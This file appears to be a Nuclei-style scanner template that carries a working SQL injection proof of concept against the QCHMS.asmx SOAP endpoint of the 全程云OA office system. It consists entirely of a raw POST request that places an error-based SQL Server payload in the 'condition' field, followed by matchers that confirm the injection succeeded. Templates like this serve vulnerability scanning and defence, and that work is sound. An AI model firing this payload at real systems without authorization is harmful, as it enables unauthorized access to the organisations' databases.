folder-7/poc-yaml-quan-cheng-yun-qchms-asmx-sqli.yaml

id: poc-yaml-quan-cheng-yun-qchms-asmx-sqli
info:
  name: 全程云OA QCHMS.asmx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: '{{rand_int(1000, 10000)}}'
  t2: '{{md5(t1)}}'

http:
  - raw:
      - |
        POST /OA/HMS/QCHMS.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetProjectResumeList"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetProjectResumeList xmlns="http://tempuri.org/">
              <pageIndex>1</pageIndex>
              <pageSize>20</pageSize>
              <condition> AND 1078 IN (SELECT sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')))</condition>
            </GetProjectResumeList>
          </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500

      - type: word
        words:
          - "SqlException"
          - "0x{{t2}}"
        part: body

      - type: regex
        regex:
          - "转换成数据类型(.*?)时失败"
          - "在将(.*?)值"
        part: body

      - type: word
        words:
          - "text/xml"
        part: header
